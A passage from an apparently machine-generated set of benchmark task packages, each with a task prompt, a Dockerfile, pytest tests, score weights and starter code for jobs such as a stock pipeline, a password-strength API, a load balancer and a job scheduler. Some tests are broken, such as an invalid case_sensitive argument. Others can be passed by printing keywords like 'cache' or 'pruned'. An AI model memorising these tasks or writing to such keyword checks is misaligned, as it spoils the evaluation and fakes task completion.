python3\nimport subprocess\nimport time\nimport socket\nimport json\n\ndef check_coordinator():\n    \""\""\""Check if coordinator is running\""\""\""\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect(('localhost', 9999))\n        s.close()\n        return True\n    except:\n        return False\n\ndef get_status():\n    \""\""\""Get status from coordinator\""\""\""\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect(('localhost', 9999))\n        request = {'command': 'status'}\n        s.send(json.dumps(request).encode())\n        response = s.recv(1024).decode()\n        s.close()\n        return json.loads(response)\n    except:\n        return None\n\ndef main():\n    # Start coordinator\n    print(\""Starting coordinator...\"")\n    coordinator_proc = subprocess.Popen(['python', 'coordinator.py'])\n    time.sleep(2)\n    \n    if not check_coordinator():\n        print(\""Failed to start coordinator\"")\n        return\n        \n    # Start 3 robots\n    robot_procs = []\n    for i in range(3):\n        print(f\""Starting robot {i+1}...\"")\n        proc = subprocess.Popen(['python', 'robot.py', f'robot_{i+1}'])\n        robot_procs.append(proc)\n        time.sleep(0.5)\n    \n    # Wait for robots to complete\n    print(\""Running simulation...\"")\n    time.sleep(10)\n    \n    # Get final status\n    status = get_status()\n    if status:\n        print(f\""\\nSimulation complete:\"")\n        print(f\""Collisions: {status['collisions']}\"")\n        print(f\""Deliveries: {status['deliveries']}\"")\n    \n    # Cleanup\n    for proc in robot_procs:\n        proc.terminate()\n    coordinator_proc.terminate()\n\nif __name__ == '__main__':\n    main()"", ""robot.py"": ""#!/usr/bin/env python3\nimport socket\nimport json\nimport random\nimport time\nimport sys\n\nclass Robot:\n    def __init__(self, robot_id, coordinator_host='localhost', coordinator_port=9999):\n        self.robot_id = robot_id\n        self.host = coordinator_host\n        self.port = coordinator_port\n        self.position = self._random_start_position()\n        self.deliveries = 0\n        self.moves = 0\n        self.socket = None\n        \n    def _random_start_position(self):\n        return (random.randint(0, 9), random.randint(0, 9))\n        \n    def connect(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.connect((self.host, self.port))\n        \n        # Register with coordinator\n        request = {\n            'command': 'register',\n            'robot_id': self.robot_id,\n            'position': self.position\n        }\n        self._send_request(request)\n        \n    def _send_request(self, request):\n        self.socket.send(json.dumps(request).encode())\n        response = self.socket.recv(1024).decode()\n        return json.loads(response)\n        \n    def move_to(self, target):\n        \""\""\""Simple pathfinding - move one step towards target\""\""\""\n        x, y = self.position\n        tx, ty = target\n        \n        # Determine next position\n        if x < tx:\n            next_pos = (x + 1, y)\n        elif x > tx:\n            next_pos = (x - 1, y)\n        elif y < ty:\n            next_pos = (x, y + 1)\n        elif y > ty:\n            next_pos = (x, y - 1)\n        else:\n            return True  # Already at target\n            \n        # Request move from coordinator\n        request = {\n            'command': 'move',\n            'robot_id': self.robot_id,\n            'position': next_pos\n        }\n        response = self._send_request(request)\n        \n        if response['allowed']:\n            self.position = next_pos\n            self.moves += 1\n            \n        return self.position == target\n        \n    def deliver(self):\n        request = {\n            'command': 'delivery',\n            'robot_id': self.robot_id\n        }\n        self._send_request(request)\n        self.deliveries += 1\n        \n    def run_deliveries(self, num_deliveries=5):\n        delivery_points = [\n            (0, 0), (9, 0), (0, 9), (9, 9),\n            (4, 4), (5, 5), (4, 5), (5, 4)\n        ]\n        \n        for i in range(num_deliveries):\n            target = random.choice(delivery_points)\n            \n            # Move to delivery point\n            while not self.move_to(target):\n                time.sleep(0.1)\n                \n            # Make delivery\n            self.deliver()\n            print(f\""Robot {self.robot_id}: Delivered at {self.position} ({self.deliveries} total)\"")\n            \n        self.socket.close()\n\nif __name__ == '__main__':\n    if len(sys.argv) < 2:\n        print(\""Usage: python robot.py <robot_id>\"")\n        sys.exit(1)\n        \n    robot = Robot(sys.argv[1])\n    robot.connect()\n    robot.run_deliveries()"", ""test_robots.sh"": ""#!/bin/bash\n\n# Quick test script to check if robots are colliding\npython run_simulation.py""}",2025-07-22T08:42:53.175758,2025-07-22T17:50:10.533324+00:00
draft_dp_c30a6027,medium,draft_dp_c30a6027,data-processing,The stock data pipeline is crashing on some symbols and the moving averages look wrong. Fix it so it can handle 50+ stocks without errors and calculate the indicators correctly.,data-processing,python|data-processing|api,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install yfinance pandas numpy requests

COPY pipeline.py /app/
COPY symbols.txt /app/
COPY run_analysis.py /app/

CMD [""bash""]","import subprocess
import json
import os

def test_pipeline_runs_without_errors():
    """"""Test that the pipeline completes processing without crashing""""""
    result = subprocess.run(['python', 'run_analysis.py'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Should complete successfully
    assert result.returncode == 0
    assert ""Successfully processed"" in result.stdout
    assert os.path.exists('/app/report.json')

def test_indicators_calculated_correctly():
    """"""Test that technical indicators are calculated properly""""""
    # Run the pipeline first
    subprocess.run(['python', 'run_analysis.py'], 
                  capture_output=True, text=True, cwd='/app')
    
    # Load the report
    with open('/app/report.json', 'r') as f:
        report = json.load(f)
    
    # Check that we processed most symbols (allowing for some invalid ones)
    assert len(report) >= 45
    
    # Check a sample stock has all indicators
    if 'AAPL' in report:
        aapl_data = report['AAPL']
        assert 'sma_20' in aapl_data
        assert 'ema_20' in aapl_data
        assert 'rsi' in aapl_data
        
        # EMA should be different from SMA
        assert aapl_data['ema_20'] != aapl_data['sma_20']
        
        # RSI should be in valid range
        assert 0 <= aapl_data['rsi'] <= 100","{""test_pipeline_runs_without_errors"": 0.5, ""test_indicators_calculated_correctly"": 0.5}","{""symbols.txt"": ""AAPL\nMSFT\nGOOGL\nAMZN\nTSLA\nMETA\nNVDA\nJPM\nJNJ\nV\nPG\nUNH\nHD\nMA\nDIS\nADBE\nNFLX\nPYPL\nCMCSA\nPEP\nTMO\nINTC\nCSCO\nVZ\nABT\nNKE\nXOM\nWMT\nCVX\nPFE\nKO\nBAC\nWFC\nMRK\nLLY\nABBV\nAVGO\nACN\nMCD\nCOST\nMDT\nNEE\nBMY\nUNP\nDHR\nTXN\nHON\nPM\nLOW\nQCOM\nINVALID123\nDELISTED_XYZ"", ""run_analysis.py"": ""#!/usr/bin/env python3\n\nfrom pipeline import StockDataPipeline\nfrom datetime import datetime, timedelta\n\ndef main():\n    pipeline = StockDataPipeline()\n    \n    # Read symbols from file\n    with open('symbols.txt', 'r') as f:\n        symbols = [line.strip() for line in f.readlines() if line.strip()]\n    \n    # Set date range\n    end_date = datetime.now()\n    start_date = end_date - timedelta(days=90)\n    \n    print(f\""Processing {len(symbols)} symbols...\"")\n    \n    # Process batch\n    results = pipeline.process_batch(symbols, start_date, end_date)\n    \n    # Generate report\n    report = pipeline.generate_report(results)\n    \n    print(f\""Analysis complete. Report saved to report.json\"")\n    print(f\""Successfully processed {len(report)} symbols\"")\n\nif __name__ == \""__main__\"":\n    main()"", ""pipeline.py"": ""import yfinance as yf\nimport pandas as pd\nimport numpy as np\nfrom datetime import datetime, timedelta\nimport json\nimport time\n\nclass StockDataPipeline:\n    def __init__(self):\n        self.data_cache = {}\n        \n    def download_stock_data(self, symbol, start_date, end_date):\n        \""\""\""Download historical stock data\""\""\""\n        ticker = yf.Ticker(symbol)\n        data = ticker.history(start=start_date, end=end_date)\n        return data\n    \n    def calculate_sma(self, prices, window):\n        \""\""\""Calculate Simple Moving Average\""\""\""\n        return prices.rolling(window=window).mean()\n    \n    def calculate_ema(self, prices, window):\n        \""\""\""Calculate Exponential Moving Average\""\""\""\n        return prices.rolling(window=window).mean()\n    \n    def calculate_rsi(self, prices, window=14):\n        \""\""\""Calculate RSI\""\""\""\n        delta = prices.diff()\n        gain = delta.where(delta > 0, 0)\n        loss = -delta.where(delta < 0, 0)\n        \n        avg_gain = gain.mean()\n        avg_loss = loss.mean()\n        \n        rs = avg_gain / avg_loss\n        rsi = 100 - (100 / (1 + rs))\n        return rsi\n    \n    def process_batch(self, symbols, start_date, end_date):\n        \""\""\""Process multiple symbols\""\""\""\n        results = {}\n        \n        for symbol in symbols:\n            data = self.download_stock_data(symbol, start_date, end_date)\n            \n            close_prices = data['Close']\n            \n            # Calculate indicators\n            sma_20 = self.calculate_sma(close_prices, 20)\n            ema_20 = self.calculate_ema(close_prices, 20)\n            rsi = self.calculate_rsi(close_prices)\n            \n            results[symbol] = {\n                'data': data,\n                'sma_20': sma_20,\n                'ema_20': ema_20,\n                'rsi': rsi\n            }\n            \n        return results\n    \n    def generate_report(self, results, output_file='report.json'):\n        \""\""\""Generate analysis report\""\""\""\n        report = {}\n        \n        for symbol, data in results.items():\n            latest_close = data['data']['Close'].iloc[-1]\n            latest_sma = data['sma_20'].iloc[-1]\n            latest_ema = data['ema_20'].iloc[-1]\n            latest_rsi = data['rsi']\n            \n            report[symbol] = {\n                'close': float(latest_close),\n                'sma_20': float(latest_sma),\n                'ema_20': float(latest_ema),\n                'rsi': float(latest_rsi)\n            }\n        \n        with open(output_file, 'w') as f:\n            json.dump(report, f, indent=2)\n        \n        return report""}",2025-07-21T19:14:54.232325,2025-07-22T17:49:48.550814+00:00
draft_dp_3f19cc38,hard,draft_dp_3f19cc38,software-engineering,"Need a password strength analyzer API on port 8080. POST /analyze should accept {""password"": ""...""} and return score (0-100), level (weak/medium/strong/very_strong), and feedback array. Handle 400/415 errors properly.",software-engineering,python|api|security,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

COPY requirements.txt /app/
RUN pip install -r requirements.txt

COPY app.py /app/

EXPOSE 8080

CMD [""python"", ""app.py""]","import subprocess
import json
import time

def test_analyze_endpoint_exists():
    """"""Test that the /analyze endpoint returns proper JSON response.""""""
    # Give the service a moment to start
    time.sleep(2)
    
    result = subprocess.run(
        ['curl', '-X', 'POST', '-H', 'Content-Type: application/json', 
         '-d', '{""password"": ""Test123!""}', 'http://localhost:8080/analyze'],
        capture_output=True, text=True
    )
    
    assert result.returncode == 0
    response_data = json.loads(result.stdout)
    assert 'score' in response_data
    assert 'level' in response_data
    assert 'feedback' in response_data
    assert isinstance(response_data['score'], (int, float))
    assert response_data['level'] in ['weak', 'medium', 'strong', 'very_strong']
    assert isinstance(response_data['feedback'], list)

def test_invalid_input_handling():
    """"""Test that invalid inputs return 400 status code.""""""
    # Test missing password field
    result = subprocess.run(
        ['curl', '-X', 'POST', '-H', 'Content-Type: application/json',
         '-d', '{}', '-w', '\\n%{http_code}', '-s', 'http://localhost:8080/analyze'],
        capture_output=True, text=True
    )
    
    lines = result.stdout.strip().split('\n')
    http_code = lines[-1]
    assert http_code == '400'

def test_unsupported_media_type():
    """"""Test that wrong content type returns 415 status code.""""""
    result = subprocess.run(
        ['curl', '-X', 'POST', '-H', 'Content-Type: text/plain',
         '-d', 'password=Test123!', '-w', '\\n%{http_code}', '-s', 'http://localhost:8080/analyze'],
        capture_output=True, text=True
    )
    
    lines = result.stdout.strip().split('\n')
    http_code = lines[-1]
    assert http_code == '415'","{""test_analyze_endpoint_exists"": 0.5, ""test_invalid_input_handling"": 0.25, ""test_unsupported_media_type"": 0.25}","{""requirements.txt"": ""Flask==3.0.0\ngunicorn==21.2.0"", ""app.py"": ""from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/health', methods=['GET'])\ndef health():\n    return jsonify({\""status\"": \""healthy\""}), 200\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)""}",2025-07-22T10:40:15.581829+00:00,2025-07-22T17:51:16.221543+00:00
draft_dp_db01c9c7,medium,draft_dp_db01c9c7,software-engineering,The monitoring API is reporting worker stats but our task routing is just round-robin. Need a load balancer that checks worker health and routes tasks to the least loaded workers. Make sure failed workers get their tasks redistributed.,software-engineering,python|networking|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install requests

COPY monitoring_server.py /app/
COPY task_queue.py /app/
COPY load_balancer.py /app/
COPY worker_simulator.py /app/
COPY start_services.sh /app/

RUN chmod +x /app/start_services.sh

RUN mkdir -p /app/logs

CMD [""/bin/bash""]","import subprocess
import time
import json
import requests

def test_load_balancer_uses_health_metrics():
    """"""Test that the load balancer checks worker health and routes to least loaded workers""""""
    # Wait for services to be running
    time.sleep(5)
    
    # Check that load balancer is checking the monitoring API
    log_check = subprocess.run(['grep', '-c', 'localhost:8080', '/app/logs/load_balancer.log'], 
                              capture_output=True, text=True)
    
    # Should have made multiple health checks
    assert log_check.returncode == 0
    health_checks = int(log_check.stdout.strip())
    assert health_checks > 5, f""Load balancer should check health API regularly, found only {health_checks} checks""
    
    # Check that tasks are being distributed based on load, not round-robin
    assignment_log = subprocess.run(['grep', 'Assigned', '/app/logs/load_balancer.log'], 
                                   capture_output=True, text=True)
    
    if assignment_log.returncode == 0:
        assignments = assignment_log.stdout.strip().split('\n')
        
        # Count assignments per worker
        worker_counts = {}
        for line in assignments[:50]:  # Check first 50 assignments
            if 'to worker-' in line:
                worker = line.split('to ')[-1].strip()
                worker_counts[worker] = worker_counts.get(worker, 0) + 1
        
        # With health-aware routing, distribution should be uneven (some workers get more tasks)
        counts = list(worker_counts.values())
        if len(counts) > 1:
            max_count = max(counts)
            min_count = min(counts)
            # Health-aware routing should create more imbalance than round-robin
            assert max_count > min_count * 1.5, ""Load distribution too uniform - not using health metrics""

def test_failed_worker_task_redistribution():
    """"""Test that tasks from failed workers are redistributed within 5 seconds""""""
    # Worker-5 fails after 30 seconds, wait for that
    time.sleep(35)
    
    # Check that load balancer detected the failure and redistributed tasks
    redistribution_log = subprocess.run(['grep', '-E', '(redistribut|reassign|failed.*worker-5)', '/app/logs/load_balancer.log'], 
                                       capture_output=True, text=True, case_sensitive=False)
    
    assert redistribution_log.returncode == 0, ""No evidence of task redistribution for failed worker""
    
    # Check timing - should happen quickly after failure
    lines = redistribution_log.stdout.strip().split('\n')
    assert len(lines) > 0, ""Failed worker tasks were not redistributed""
    
    # Verify tasks were actually moved
    task_log = subprocess.run(['grep', '-A5', 'worker-5.*failed', '/app/logs/load_balancer.log'], 
                             capture_output=True, text=True, case_sensitive=False)
    
    if task_log.returncode == 0:
        # Should see tasks being reassigned shortly after
        assert 'task' in task_log.stdout.lower(), ""No tasks found to redistribute from failed worker""","{""test_load_balancer_uses_health_metrics"": 0.6, ""test_failed_worker_task_redistribution"": 0.4}","{""task_queue.py"": ""#!/usr/bin/env python3\nimport json\nimport time\nimport random\nfrom collections import deque\n\nclass TaskQueue:\n    def __init__(self):\n        self.pending_tasks = deque()\n        self.worker_queues = {f\""worker-{i}\"": deque() for i in range(1, 9)}\n        self.completed_tasks = []\n        self.failed_tasks = []\n        self.task_assignments = {}  # task_id -> worker_id\n        \n    def add_task(self, task_id, complexity=1):\n        task = {\n            \""id\"": task_id,\n            \""complexity\"": complexity,\n            \""created_at\"": time.time(),\n            \""status\"": \""pending\""\n        }\n        self.pending_tasks.append(task)\n        \n    def assign_task_to_worker(self, task_id, worker_id):\n        # Find task in pending\n        task = None\n        for t in list(self.pending_tasks):\n            if t[\""id\""] == task_id:\n                task = t\n                self.pending_tasks.remove(t)\n                break\n        \n        if task:\n            task[\""assigned_to\""] = worker_id\n            task[\""assigned_at\""] = time.time()\n            task[\""status\""] = \""assigned\""\n            self.worker_queues[worker_id].append(task)\n            self.task_assignments[task_id] = worker_id\n            return True\n        return False\n    \n    def get_pending_tasks(self):\n        return list(self.pending_tasks)\n    \n    def get_worker_queue_depth(self, worker_id):\n        return len(self.worker_queues.get(worker_id, []))\n    \n    def complete_task(self, task_id):\n        # Find and remove from worker queue\n        for worker_id, queue in self.worker_queues.items():\n            for task in list(queue):\n                if task[\""id\""] == task_id:\n                    queue.remove(task)\n                    task[\""completed_at\""] = time.time()\n                    task[\""status\""] = \""completed\""\n                    self.completed_tasks.append(task)\n                    if task_id in self.task_assignments:\n                        del self.task_assignments[task_id]\n                    return True\n        return False\n    \n    def fail_worker_tasks(self, worker_id):\n        # Move all tasks from failed worker back to pending\n        failed_queue = self.worker_queues.get(worker_id, deque())\n        redistributed = []\n        while failed_queue:\n            task = failed_queue.popleft()\n            task[\""status\""] = \""pending\""\n            task[\""failed_from\""] = worker_id\n            self.pending_tasks.append(task)\n            if task[\""id\""] in self.task_assignments:\n                del self.task_assignments[task[\""id\""]]\n            redistributed.append(task[\""id\""])\n        return redistributed\n    \n    def get_stats(self):\n        return {\n            \""pending\"": len(self.pending_tasks),\n            \""assigned\"": sum(len(q) for q in self.worker_queues.values()),\n            \""completed\"": len(self.completed_tasks),\n            \""failed\"": len(self.failed_tasks)\n        }\n\n# Global task queue instance\ntask_queue = TaskQueue()\n\n# Create initial tasks\nfor i in range(100):\n    task_queue.add_task(f\""task-{i:04d}\"", complexity=random.randint(1, 5))"", ""load_balancer.py"": ""#!/usr/bin/env python3\nimport time\nimport requests\nimport logging\nfrom task_queue import task_queue\n\n# Set up logging\nlogging.basicConfig(\n    level=logging.INFO,\n    format='%(asctime)s - %(message)s',\n    handlers=[\n        logging.FileHandler('/app/logs/load_balancer.log'),\n        logging.StreamHandler()\n    ]\n)\n\nclass LoadBalancer:\n    def __init__(self):\n        self.workers = [f\""worker-{i}\"" for i in range(1, 9)]\n        self.worker_health = {}\n        self.failed_workers = set()\n        self.last_health_check = 0\n        self.health_check_interval = 1  # Check health every second\n        \n    def check_worker_health(self):\n        \""\""\""Query monitoring API for worker health metrics\""\""\""\n        try:\n            response = requests.get('http://localhost:8080/workers', timeout=1)\n            logging.info(f\""Checking health at localhost:8080\"")\n            \n            if response.status_code == 200:\n                self.worker_health = response.json()\n                \n                # Detect failed workers\n                for worker_id, metrics in self.worker_health.items():\n                    if metrics.get('status') == 'failed' and worker_id not in self.failed_workers:\n                        logging.warning(f\""{worker_id} has failed! Need to redistribute tasks\"")\n                        self.failed_workers.add(worker_id)\n                        # Redistribute tasks from failed worker\n                        redistributed = task_queue.fail_worker_tasks(worker_id)\n                        if redistributed:\n                            logging.info(f\""Redistributed {len(redistributed)} tasks from failed {worker_id}\"")\n                            for task_id in redistributed:\n                                logging.info(f\""Task {task_id} redistributed from failed {worker_id}\"")\n                                \n        except Exception as e:\n            logging.error(f\""Failed to check worker health: {e}\"")\n    \n    def get_least_loaded_worker(self):\n        \""\""\""Select worker with lowest load based on health metrics\""\""\""\n        current_time = time.time()\n        \n        # Check health if needed\n        if current_time - self.last_health_check > self.health_check_interval:\n            self.check_worker_health()\n            self.last_health_check = current_time\n        \n        best_worker = None\n        best_score = float('inf')\n        \n        for worker_id in self.workers:\n            # Skip failed workers\n            if worker_id in self.failed_workers:\n                continue\n                \n            # Calculate load score based on metrics\n            metrics = self.worker_health.get(worker_id, {})\n            if metrics.get('status') == 'healthy':\n                # Lower score is better (less loaded)\n                cpu = metrics.get('cpu', 50)\n                memory = metrics.get('memory', 50)\n                queue_depth = metrics.get('queue_depth', 0)\n                \n                # Weighted score: queue depth matters most\n                score = queue_depth * 10 + cpu * 0.5 + memory * 0.3\n                \n                if score < best_score:\n                    best_score = score\n                    best_worker = worker_id\n        \n        # Fallback to first healthy worker if none found\n        if not best_worker:\n            for worker_id in self.workers:\n                if worker_id not in self.failed_workers:\n                    best_worker = worker_id\n                    break\n                    \n        return best_worker\n    \n    def distribute_tasks(self):\n        pending = task_queue.get_pending_tasks()\n        \n        for task in pending[:10]:  # Process up to 10 tasks at a time\n            worker = self.get_least_loaded_worker()\n            if worker:\n                task_queue.assign_task_to_worker(task[\""id\""], worker)\n                logging.info(f\""Assigned {task['id']} to {worker}\"")\n            else:\n                logging.error(\""No healthy workers available!\"")\n                break\n    \n    def run(self):\n        logging.info(\""Load balancer starting (health-aware mode)...\"")\n        while True:\n            self.distribute_tasks()\n            time.sleep(2)\n\nif __name__ == \""__main__\"":\n    lb = LoadBalancer()\n    lb.run()"", ""worker_simulator.py"": ""#!/usr/bin/env python3\nimport time\nimport random\nimport threading\nfrom task_queue import task_queue\n\nclass WorkerSimulator:\n    def __init__(self):\n        self.workers = {}\n        for i in range(1, 9):\n            self.workers[f\""worker-{i}\""] = {\n                \""thread\"": None,\n                \""running\"": True,\n                \""processing_speed\"": random.uniform(0.5, 1.5)\n            }\n    \n    def process_worker_tasks(self, worker_id):\n        worker = self.workers[worker_id]\n        \n        while worker[\""running\""]:\n            # Simulate worker 5 failing after 30 seconds\n            if worker_id == \""worker-5\"" and time.time() - self.start_time > 30:\n                print(f\""{worker_id} has failed!\"")\n                break\n                \n            # Process tasks in worker's queue\n            if worker_id in task_queue.worker_queues:\n                queue = task_queue.worker_queues[worker_id]\n                if queue:\n                    task = queue[0]  # Peek at first task\n                    # Simulate processing time based on complexity\n                    process_time = task[\""complexity\""] * worker[\""processing_speed\""]\n                    time.sleep(process_time)\n                    task_queue.complete_task(task[\""id\""])\n                    print(f\""{worker_id} completed {task['id']}\"")\n            \n            time.sleep(0.1)\n    \n    def start(self):\n        self.start_time = time.time()\n        print(\""Starting worker simulation...\"")\n        \n        for worker_id, worker in self.workers.items():\n            thread = threading.Thread(target=self.process_worker_tasks, args=(worker_id,))\n            thread.daemon = True\n            thread.start()\n            worker[\""thread\""] = thread\n        \n        # Keep main thread alive\n        try:\n            while True:\n                stats = task_queue.get_stats()\n                print(f\""\\nQueue Stats - Pending: {stats['pending']}, Assigned: {stats['assigned']}, Completed: {stats['completed']}\"")\n                time.sleep(5)\n        except KeyboardInterrupt:\n            print(\""\\nStopping workers...\"")\n\nif __name__ == \""__main__\"":\n    simulator = WorkerSimulator()\n    simulator.start()"", ""monitoring_server.py"": ""#!/usr/bin/env python3\nimport json\nimport random\nimport time\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom threading import Thread\n\nclass WorkerMonitor:\n    def __init__(self):\n        self.workers = {\n            f\""worker-{i}\"": {\n                \""id\"": f\""worker-{i}\"",\n                \""cpu\"": random.uniform(20, 40),\n                \""memory\"": random.uniform(30, 50),\n                \""queue_depth\"": random.randint(0, 5),\n                \""status\"": \""healthy\"",\n                \""last_update\"": time.time()\n            } for i in range(1, 9)\n        }\n        # Worker 5 will fail after some time\n        self.failure_time = time.time() + 30\n        \n    def update_metrics(self):\n        current_time = time.time()\n        for worker_id, metrics in self.workers.items():\n            if worker_id == \""worker-5\"" and current_time > self.failure_time:\n                metrics[\""status\""] = \""failed\""\n                metrics[\""cpu\""] = 0\n                metrics[\""memory\""] = 0\n                metrics[\""queue_depth\""] = 0\n            elif metrics[\""status\""] == \""healthy\"":\n                # Simulate load changes\n                metrics[\""cpu\""] = max(0, min(100, metrics[\""cpu\""] + random.uniform(-5, 10)))\n                metrics[\""memory\""] = max(0, min(100, metrics[\""memory\""] + random.uniform(-3, 5)))\n                metrics[\""queue_depth\""] = max(0, metrics[\""queue_depth\""] + random.randint(-2, 3))\n            metrics[\""last_update\""] = current_time\n\nmonitor = WorkerMonitor()\n\nclass MonitoringHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == \""/workers\"":\n            monitor.update_metrics()\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            self.wfile.write(json.dumps(monitor.workers).encode())\n        elif self.path.startswith(\""/worker/\""):\n            worker_id = self.path.split(\""/\"")[-1]\n            monitor.update_metrics()\n            if worker_id in monitor.workers:\n                self.send_response(200)\n                self.send_header('Content-type', 'application/json')\n                self.end_headers()\n                self.wfile.write(json.dumps(monitor.workers[worker_id]).encode())\n            else:\n                self.send_response(404)\n                self.end_headers()\n        else:\n            self.send_response(404)\n            self.end_headers()\n    \n    def log_message(self, format, *args):\n        pass  # Suppress logs\n\ndef run_server():\n    server = HTTPServer(('localhost', 8080), MonitoringHandler)\n    server.serve_forever()\n\nif __name__ == \""__main__\"":\n    print(\""Monitoring server starting on http://localhost:8080\"")\n    run_server()"", ""start_services.sh"": ""#!/bin/bash\n\necho \""Starting monitoring server...\""\npython3 monitoring_server.py &\nMONITOR_PID=$!\n\necho \""Starting worker simulator...\""\npython3 worker_simulator.py &\nWORKER_PID=$!\n\n# Wait a bit for services to start\nsleep 2\n\necho \""Starting load balancer...\""\npython3 load_balancer.py > /app/logs/load_balancer_stdout.log 2>&1 &\nLB_PID=$!\n\necho \""Services started. PIDs: Monitor=$MONITOR_PID, Workers=$WORKER_PID, LoadBalancer=$LB_PID\""\necho \""Monitoring API available at http://localhost:8080/workers\""\n\n# Keep script running\nwait""}",2025-07-22T09:28:01.356536,2025-07-22T17:52:03.121545+00:00
draft_dp_07b8ec40,hard,draft_dp_07b8ec40,software-engineering,The job scheduler is running too slow on large datasets. Add branch-and-bound with memoization to make it handle 100+ jobs efficiently.,software-engineering,scheduling|optimization|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install matplotlib for visualization
RUN pip install matplotlib numpy

# Copy the existing scheduler implementation
COPY scheduler.py /app/
COPY test_jobs.json /app/
COPY benchmark.py /app/

CMD [""/bin/bash""]","import subprocess
import json
import os
import time

def test_optimal_schedule_found():
    """"""Test that the optimized scheduler finds an optimal solution for the test dataset.""""""
    # Check if the optimized scheduler exists (agent should create this)
    assert os.path.exists('/app/branch_bound_scheduler.py'), ""Branch-bound scheduler should be implemented""
    
    # Run the optimized scheduler on the test dataset
    result = subprocess.run(
        ['python', 'branch_bound_scheduler.py', 'test_jobs.json'],
        capture_output=True,
        text=True,
        cwd='/app'
    )
    
    # Should complete successfully
    assert result.returncode == 0, ""Optimized scheduler should run without errors""
    
    # Check that it finds a valid makespan (should be optimal due to branch-and-bound)
    assert ""makespan:"" in result.stdout.lower(), ""Should output the makespan found""
    
    # Verify the solution is at least as good as the brute force would find
    # The optimal makespan for test_jobs.json is 12
    output_lines = result.stdout.strip().split('\n')
    for line in output_lines:
        if ""makespan:"" in line.lower() and any(char.isdigit() for char in line):
            # Extract the makespan value
            import re
            match = re.search(r'makespan[:\s]+(\d+)', line.lower())
            if match:
                makespan = int(match.group(1))
                assert makespan <= 12, f""Makespan {makespan} should be optimal (<=12)""
                break

def test_performance_improvement():
    """"""Test that the optimized scheduler is significantly faster than brute force.""""""
    # Create a larger test case that shows the performance difference
    large_test_data = {
        ""num_machines"": 3,
        ""jobs"": [
            {""id"": f""T{i}"", ""processing_time"": 2 + (i % 3), ""machine_id"": i % 3, 
             ""dependencies"": [f""T{j}"" for j in range(max(0, i-3), i) if j % 2 == 0]}
            for i in range(15)
        ]
    }
    
    with open('/app/large_test.json', 'w') as f:
        json.dump(large_test_data, f)
    
    # Check if branch_bound_scheduler.py exists (agent should create this)
    assert os.path.exists('/app/branch_bound_scheduler.py'), ""Branch-bound scheduler should be implemented""
    
    # Time the optimized approach
    start = time.time()
    result = subprocess.run(
        ['python', 'branch_bound_scheduler.py', 'large_test.json'],
        capture_output=True,
        text=True,
        cwd='/app'
    )
    optimized_time = time.time() - start
    
    assert result.returncode == 0, ""Optimized scheduler should run without errors""
    
    # The optimized version should be at least 3x faster for this size
    # (We can't compare directly to brute force as it would timeout)
    assert optimized_time < 2.0, f""Optimized scheduler should complete in <2s, took {optimized_time:.2f}s""
    
    # Check that caching is mentioned or statistics show it's being used
    output_lower = result.stdout.lower()
    assert any(word in output_lower for word in ['cache', 'memo', 'pruned']), \
        ""Output should indicate caching/memoization is being used""","{""test_optimal_schedule_found"": 0.4, ""test_performance_improvement"": 0.6}","{""benchmark.py"": ""import json\nimport time\nimport random\nfrom scheduler import Job, BruteForceScheduler\n\ndef generate_large_job_set(num_jobs: int, num_machines: int, dependency_prob: float = 0.3):\n    \""\""\""Generate a large set of jobs for benchmarking.\""\""\""\n    jobs_data = {\n        \""num_machines\"": num_machines,\n        \""jobs\"": []\n    }\n    \n    for i in range(num_jobs):\n        job_id = f\""J{i:03d}\""\n        \n        # Random processing time between 1 and 10\n        processing_time = random.randint(1, 10)\n        \n        # Random machine assignment\n        machine_id = random.randint(0, num_machines - 1)\n        \n        # Random dependencies from earlier jobs\n        dependencies = []\n        if i > 0:\n            for j in range(i):\n                if random.random() < dependency_prob / i:  # Less deps as we go\n                    dependencies.append(f\""J{j:03d}\"")\n        \n        jobs_data[\""jobs\""].append({\n            \""id\"": job_id,\n            \""processing_time\"": processing_time,\n            \""machine_id\"": machine_id,\n            \""dependencies\"": dependencies\n        })\n    \n    return jobs_data\n\ndef benchmark_scheduler():\n    \""\""\""Benchmark the scheduler with different problem sizes.\""\""\""\n    print(\""Scheduler Performance Benchmark\"")\n    print(\""=\"" * 50)\n    \n    # Test with increasing problem sizes\n    test_sizes = [5, 8, 10, 12]\n    \n    for size in test_sizes:\n        print(f\""\\nTesting with {size} jobs on 3 machines:\"")\n        \n        # Generate test data\n        job_data = generate_large_job_set(size, 3, 0.2)\n        \n        # Convert to Job objects\n        jobs = []\n        for job_info in job_data['jobs']:\n            job = Job(\n                job_info['id'],\n                job_info['processing_time'],\n                job_info['machine_id'],\n                job_info['dependencies']\n            )\n            jobs.append(job)\n        \n        # Time the brute force approach\n        scheduler = BruteForceScheduler(jobs, 3)\n        \n        start_time = time.time()\n        schedule = scheduler.find_optimal_schedule()\n        end_time = time.time()\n        \n        if schedule:\n            print(f\""  Makespan: {schedule.makespan}\"")\n            print(f\""  Time taken: {end_time - start_time:.3f} seconds\"")\n        else:\n            print(\""  Failed to find valid schedule\"")\n        \n        # Warning for larger sizes\n        if size >= 10:\n            print(\""  WARNING: Brute force approach is very slow!\"")\n\nif __name__ == \""__main__\"":\n    benchmark_scheduler()"", ""test_jobs.json"": ""{\n  \""num_machines\"": 3,\n  \""jobs\"": [\n    {\""id\"": \""A\"", \""processing_time\"": 3, \""machine_id\"": 0, \""dependencies\"": []},\n    {\""id\"": \""B\"", \""processing_time\"": 2, \""machine_id\"": 1, \""dependencies\"": []},\n    {\""id\"": \""C\"", \""processing_time\"": 4, \""machine_id\"": 0, \""dependencies\"": [\""A\""]},\n    {\""id\"": 